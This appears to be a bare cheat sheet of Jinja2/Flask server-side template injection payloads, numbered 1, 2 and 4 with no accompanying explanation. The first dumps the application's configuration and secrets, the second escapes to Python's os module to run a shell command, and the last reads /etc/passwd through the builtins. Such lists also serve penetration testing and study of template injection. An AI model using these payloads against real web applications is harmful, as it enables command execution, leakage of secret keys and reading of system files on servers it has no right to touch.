1. {{ config.items() }}

2. {{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

4. {{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}